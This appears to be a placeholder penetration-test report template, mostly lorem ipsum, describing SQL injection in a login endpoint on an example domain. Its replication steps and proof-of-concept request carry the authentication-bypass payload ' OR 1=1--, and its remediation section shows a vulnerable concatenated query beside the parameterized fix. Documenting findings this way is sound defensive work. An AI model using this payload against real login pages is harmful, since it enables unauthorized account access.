---
title: "Lorem Ipsum Finding — SQL Injection in Authentication Endpoint"
# Severity and CVSS score are computed automatically from the vector below.
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
status: "Open"
component: "Authentication API"
cwe: "CWE-89"
owasp: "A03:2021"
mitre: "T1190"
mitigations: "M1032, M1038"
impact: "Critical"
sophistication: "Low"
material_impact: "Proprietary Data Loss"
business_risk:
  - Operational
  - Financial
  - Reputational
affected_urls:
  - "https://portal.loremipsum.example/api/login"
timeline:
  - date: "1970-01-01T14:20:00+00:00"
    description: "Lorem ipsum dolor sit amet — identified SQL injection in authentication endpoint; reported to Lorem Ipsum Holdings immediately"
    include: true
---

## Description

Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. The `/api/login` endpoint is vulnerable to SQL Injection: ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.

## Impact

Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.

## Replication

1. Lorem ipsum dolor sit amet: navigate to `https://portal.loremipsum.example/api/login`.
2. Consectetur adipiscing elit: intercept the POST request with a proxy.
3. Sed do eiusmod tempor: set the `username` parameter to `' OR 1=1--` and any value for `password`.
4. Incididunt ut labore: forward the request — authentication is bypassed and the first user's session is returned.

**Proof of Concept:**

```http
POST /api/login HTTP/1.1
Host: portal.loremipsum.example
Content-Type: application/json

{"username": "' OR 1=1--", "password": "anything"}
```

**Response:**

```json
{"token": "lorem.ipsum.dolor-sit-amet-placeholder-token", "user": "admin"}
```

![Lorem ipsum placeholder screenshot for this finding](../assets/screenshots/sqli-auth-bypass.png){width=90%}

## Remediation

Lorem ipsum dolor sit amet, replace string concatenation with parameterized queries (prepared statements):

```python
# Vulnerable
query = f"SELECT * FROM users WHERE username = '{username}'"

# Fixed
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
```

Consectetur adipiscing elit: apply this fix to all database interactions. Ut enim ad minim veniam, implement a Web Application Firewall (WAF) as a defense-in-depth measure, but do not rely on it as the primary control.
